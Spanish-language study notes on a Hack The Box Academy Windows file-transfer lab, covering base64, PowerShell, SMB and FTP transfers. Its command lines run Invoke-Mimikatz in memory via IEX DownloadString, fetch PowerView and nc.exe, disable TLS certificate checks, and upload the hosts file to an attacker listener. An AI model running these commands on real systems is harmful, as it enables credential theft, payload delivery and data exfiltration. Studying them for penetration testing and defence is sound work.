Comprender la transferencia de archivos en Windows puede ayudar tanto a los atacantes como a los defensores.
- Los atacantes pueden utilizar varios métodos de transferencia de archivos para operar y evitar ser atrapados.
- Los defensores pueden aprender cómo funcionan estos métodos para monitorear y crear las políticas correspondientes para evitar verse comprometidos.
#### Astaroth
https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/

El término `fileless`  sugiere que una amenaza no viene en un archivo, sino que utilizan herramientas legítimas integradas en un sistema para ejecutar un ataque. 

> *El archivo no está "presente" en el sistema, sino que se ejecuta en la memoria.*

> [!NOTE]
> > El `Astaroth attack` generalmente seguía estos pasos: Un enlace malicioso en un correo electrónico de phishing dirigido a un archivo LNK. Al hacer doble clic, el archivo LNK provocaba la ejecución de la [herramienta WMIC](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) con el parámetro "/Format", que permitía la descarga y ejecución de código JavaScript malicioso. El código JavaScript, a su vez, descarga payloads abusando de la [herramienta Bitsadmin](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool) .
> > Todas las cargas útiles se codificaron en base64 y se decodificaron utilizando la herramienta Certutil, lo que generó algunos archivos DLL. La [herramienta regsvr32 para cargar una de las DLL decodificadas, que descifró y cargó otros archivos hasta que la carga útil final, Astaroth, se inyectó en el](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) luego se usó el proceso `Userinit`. A continuación se muestra una representación gráfica del ataque.

![Ataroth](https://academy.hackthebox.com/storage/modules/24/fig1a-astaroth-attack-chain.png)

## Download Operations
Tenemos acceso a la máquina. `MS02`, y necesitamos descargar un archivo de nuestra maquina `Pwnbox`. Veamos cómo podemos lograr esto usando múltiples métodos de descarga de archivos.

![[2024-06-19_08-40.png]]

#### Codificación y decodificación PowerShell Base64
Si tenemos acceso a una terminal, podemos codificar un archivo en una cadena base64, copiar su contenido desde la terminal y realizar la operación inversa, decodificando el archivo en el contenido original. Un paso esencial al utilizar este método es asegurarse de que el archivo que codifica y decodifica sea correcto. Podemos utilizar [md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html) , un programa que calcula y verifica sumas de comprobación MD5 de 128 bits. El hash MD5 funciona como una huella digital compacta de un archivo, lo que significa que un archivo debe tener el mismo hash MD5 en todas partes.

#### Comprueba el Hash MD5 del archivo hola.txt
```js
┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ md5sum hola.txt                      
1fec55901495925250c740e68f037e5c  hola.txt
```

#### Codifica el texto en Base64
```js
┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ cat hola.txt |base64 -w 0;echo
SG9sYSBIVEIK
```

Podemos copiar este contenido y pegarlo en una terminal de Windows PowerShell y usar algunas funciones de PowerShell para decodificarlo.

```powershell
PS C:\Users\htb-student> [IO.File]::WriteAllBytes("C:\Users\Public\hola.txt", [Convert]::FromBase64String("SG9sYSBIVEIK"))
```

Finalmente, podemos confirmar si el archivo se transfirió exitosamente usando el [cmdlet Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) , que hace lo mismo que `md5sum` hace.

```powershell
PS C:\Users\htb-student> Get-FileHash C:\Users\Public\hola.txt -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             1FEC55901495925250C740E68F037E5C                                       C:\Users\Public\hola.txt
```

> [!NOTE]
> **Nota:** Si bien este método es conveniente, no siempre es posible utilizarlo. La utilidad de línea de comandos de Windows (cmd.exe) tiene una longitud máxima de cadena de 8191 caracteres. Además, un shell web puede generar errores si intenta enviar cadenas extremadamente grandes.


## PowerShell Web Downloads
La mayoría de las empresas permiten `HTTP` y `HTTPS`tráfico saliente a través del firewall para permitir la productividad de los empleados. Aun así, los putitos del blue pueden utilizar soluciones de filtrado web para impedir el acceso a categorías específicas de sitios web, bloquear la descarga de tipos de archivos (como .exe) o permitir sólo el acceso a una lista de dominios incluidos en la lista blanca en redes más restringidas.
PowerShell ofrece muchas opciones de transferencia de archivos. En cualquier versión de PowerShell, la [clase System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) se puede utilizar para descargar un archivo `HTTP`, `HTTPS` o `FTP`. La siguiente [tabla](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describe los métodos de WebClient para descargar datos de un recurso:

| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Devuelve los datos de un recurso como [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Devuelve los datos de un recurso sin bloquear el hilo de llamada.                                                          |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Descarga datos de un recurso y devuelve una matriz de bytes.                                                               |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Descarga datos de un recurso y devuelve una matriz de bytes sin bloquear el hilo de llamada.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Descarga datos de un recurso a un archivo local.                                                                           |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Descarga datos de un recurso a un archivo local sin bloquear el hilo de llamada.                                           |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Descarga una cadena de un recurso y devuelve una cadena.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Descarga una cadena de un recurso sin bloquear el hilo de llamada.                                                         |

#### Método de descarga de archivos de PowerShell
Podemos especificar el nombre de la clase. `Net.WebClient` y el método `DownloadFile` con los parámetros correspondientes a la URL del archivo de destino a descargar y el nombre del archivo de salida.
#### Descarga de archivos


```powershell
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

```powershell
## IN WINDOWS
PS C:\Users\htb-student> (New-Object Net.WebClient).DownloadFile('http://10.10.15.13:8000/hola.txt','C:\Users\Public\Downloads\hola.txt')

## IN MY KALI
┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ python3 -m http.server                      
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.131.161 - - [19/Jun/2024 09:39:16] "GET /hola.txt HTTP/1.1" 200 -
```

#### PowerShell DownloadString: método sin archivos
Como comentamos anteriormente, los ataques sin archivos funcionan utilizando algunas funciones del sistema operativo para descargar la carga útil y ejecutarla directamente. PowerShell también se puede utilizar para realizar ataques sin archivos. En lugar de descargar un script de PowerShell al disco, podemos ejecutarlo directamente en la memoria usando el [cmdlet Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) o el alias `IEX`.

```powershell
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

#### PowerShell Invoke-WebRequest
A partir de PowerShell 3.0, el [cmdlet Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) también está disponible, pero es notablemente más lento a la hora de descargar archivos. Puedes usar los alias `iwr`, `curl`, y `wget` en vez de `Invoke-WebRequest` nombre completo.
```powershell
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Harmj0y ha recopilado una extensa lista de soportes de descarga PowerShell [aquí](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). Vale la pena familiarizarse con ellos y sus matices, como la falta de conciencia de proxy o tocar el disco (descargar un archivo en el objetivo) para seleccionar el adecuado para la situación.

#### Errores comunes con PowerShell
Puede haber casos en los que la configuración de primer inicio de Internet Explorer no se haya completado, lo que impide la descarga. Esto se puede omitir usando el parámetro `-UseBasicParsing`.
```powershell
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Otro error en las descargas de PowerShell está relacionado con el canal seguro SSL/TLS si el certificado no es de confianza. Podemos evitar ese error con el siguiente comando:
```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException

PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```


## SMB Downloads
El protocolo Server Message Block (protocolo SMB) que se ejecuta en el puerto TCP/445 es común en redes empresariales donde se ejecutan servicios de Windows. Permite que las aplicaciones y los usuarios transfieran archivos hacia y desde servidores remotos. Podemos usar SMB para descargar archivos desde nuestro Kali fácilmente. Necesitamos crear un servidor SMB en nuestro Kali con [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) de Impacket y luego usar `copy`, `move`, PowerShell `Copy-Item`, o cualquier otra herramienta que permita la conexión a SMB.

#### Crear  SMB Server
```js
┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ sudo impacket-smbserver share -smb2support /tmp/smbshare
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

> [!NOTE]
> ##### Importante
> Una vez que inicio el servidor SMB, me fije como trabaja desde mi Kali, por que desde Windows siguiendo las instrucciones no funcaba el proceso.
> ```js
> ┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
> └─$ smbclient -N -L //10.10.15.13/SHARE
> 
>         Sharename       Type      Comment
>         ---------       ----      -------
>         IPC$            Disk      
>         SHARE           Disk      
> Reconnecting with SMB1 for workgroup listing.
> do_connect: Connection to 10.10.15.13 failed (Error NT_STATUS_CONNECTION_REFUSED)
> Unable to connect with SMB1 -- no workgroup available
> ```
> 
> El IPC$ es el que me da acceso a los archivos, el otro no. 
> ```js
> ┌──(pelado㉿kali)-[/tmp]
> └─$ smbclient //10.10.15.13/IPC$ 
> Password for [WORKGROUP\pelado]:
> Try "help" to get a list of possible commands.
> smb: \> ls
>   hola.txt                           AN        9  Wed Jun 19 08:46:00 2024
>   upload_win.zip                     AN      194  Tue Jun 18 17:04:01 2024
> 
>                 148529400 blocks of size 1024. 14851044 blocks available
> smb: \> 
> ```
> 
> 
> 


Para descargar un archivo desde el servidor SMB al directorio Windows de trabajo actual, podemos usar el siguiente comando:
```cmd
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```

Las nuevas versiones de Windows bloquean el acceso de invitados no autenticados, como podemos ver en el siguiente comando:
```cmd
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

Para transferir archivos en este escenario, podemos establecer un nombre de usuario y contraseña usando nuestro servidor Impacket SMB y montar el servidor SMB en nuestra máquina de destino con Windows:
```js
┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
[sudo] password for pelado: 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

#### Monte el servidor SMB con nombre de usuario y contraseña
```cmd
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

## Descargas FTP
Otra forma de transferir archivos es mediante FTP (Protocolo de transferencia de archivos), que utiliza los puertos TCP/21 y TCP/20. Podemos utilizar el cliente FTP o PowerShell Net.WebClient para descargar archivos desde un servidor FTP.
#### Instalación del módulo Python3 del servidor FTP - pyftpdlib
```js
p314d0@htb[/htb]$ sudo pip3 install pyftpdlib
```
#### Configurar un servidor FTP Python3
```js
┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ sudo python3 -m pyftpdlib --port 21
[I 2024-06-19 10:26:43] concurrency model: async
[I 2024-06-19 10:26:43] masquerade (NAT) address: None
[I 2024-06-19 10:26:43] passive ports: None
[I 2024-06-19 10:26:43] >>> starting FTP server on 0.0.0.0:21, pid=71290 <<<
```

#### Transferir archivos desde un servidor FTP usando PowerShell
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://10.10.15.13/hola.txt', 'C:\Users\Public\ftp-file.txt')
```

```js
┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ sudo python3 -m pyftpdlib --port 21
[I 2024-06-19 10:26:43] concurrency model: async
[I 2024-06-19 10:26:43] masquerade (NAT) address: None
[I 2024-06-19 10:26:43] passive ports: None
[I 2024-06-19 10:26:43] >>> starting FTP server on 0.0.0.0:21, pid=71290 <<<
[I 2024-06-19 10:28:11] 10.129.131.161:49684-[] FTP session opened (connect)
[I 2024-06-19 10:28:12] 10.129.131.161:49684-[anonymous] USER 'anonymous' logged in.
[I 2024-06-19 10:28:13] 10.129.131.161:49684-[anonymous] RETR /home/pelado/HTB/Academy/FileTransfer/hola.txt completed=1 bytes=9 seconds=0.001
```

Cuando obtenemos un shell en una máquina remota, es posible que no tengamos un shell interactivo. Si ese es el caso, podemos crear un archivo de comando FTP para descargar un archivo. Primero, necesitamos crear un archivo que contenga los comandos que queremos ejecutar y luego usar el cliente FTP para usar ese archivo para descargarlo.
#### Cree un archivo de comando para el cliente FTP y descargue el archivo de destino
```js
C:\Users\htb-student>echo open 10.10.15.13 > ftpcommand.txt
C:\Users\htb-student>echo USER anonymous >> ftpcommand.txt
C:\Users\htb-student>echo binary >> ftpcommand.txt
C:\Users\htb-student>echo GET hola.txt >> ftpcommand.txt
C:\Users\htb-student>echo bye >> ftpcommand.txt
C:\Users\htb-student>ftp -v -n -s:ftpcommand.txt
ftp> open 10.10.15.13
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET hola.txt
ftp> bye

C:\Users\htb-student>
```

## Upload Operations
## Codificación y decodificación PowerShell Base64
Vimos cómo decodificar una cadena base64 usando Powershell. Ahora, hagamos la operación inversa y codifiquemos un archivo para poder decodificarlo en nuestro host de ataque.
#### Codificar archivo usando PowerShell
```powershell
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=


PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

#### Decodificar cadena Base64 en Linux
```js
┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts 

┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ cat hosts                     
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost

┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ md5sum hosts             
3688374325b992def12793500307566d  hosts

```

## Cargas web de PowerShell
PowerShell no tiene una función incorporada para operaciones de carga, pero podemos usar `Invoke-WebRequest` o `Invoke-RestMethod`para construir nuestra función de carga. También necesitaremos un servidor web que acepte cargas, lo cual no es una opción predeterminada en la mayoría de las utilidades de servidor web comunes. Para nuestro servidor web, podemos usar [uploadserver](https://github.com/Densaugeo/uploadserver) , un módulo extendido del [módulo HTTP.server](https://docs.python.org/3/library/http.server.html) de Python , que incluye una página de carga de archivos. Instalémoslo e iniciemos el servidor web.

#### Instalación de un servidor web configurado con carga
```
pip3 install uploadserver
```

```js
┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ python3 -m uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Ahora podemos usar un script de PowerShell [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) que usa `Invoke-RestMethod`para realizar las operaciones de carga. El script acepta dos parámetros. `-File`, que utilizamos para especificar la ruta del archivo, y `-Uri`, la URL del servidor donde cargaremos nuestro archivo. Intentemos cargar el archivo de host desde nuestro host de Windows.

EN ESTE CASO COMO LA MAQUINA WINDOWS DE HTB NO TIENE CONEXION A INTERNET, ALOJE EL ARCHIVO PSUPLOAD.PS1 EN MI KALI Y LO DESCARGUE DESDE ALLI.
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://10.10.15.13/PSUpload.ps1')

Invoke-FileUpload -Uri http://10.10.15.13:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```


### Carga web de PowerShell Base64
Otra forma de utilizar archivos codificados en PowerShell y base64 para operaciones de carga es mediante el uso `Invoke-WebRequest` o `Invoke-RestMethod`junto con Netcat. Usamos Netcat para escuchar en un puerto que especificamos y enviamos el archivo como `POST`pedido. Finalmente, copiamos la salida y usamos la función de decodificación base64 para convertir la cadena base64 en un archivo.

```powershell
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://10.10.15.13:8000/ -Method POST -Body $b64
```

```js
┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.15.13] from (UNKNOWN) [10.129.131.161] 49690
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.206
Content-Type: application/x-www-form-urlencoded
Host: 10.10.15.13:8000
Content-Length: 1100
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
```

```js
┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= |base64 -d -w 0 > hosts3
```

## SMB Uploads
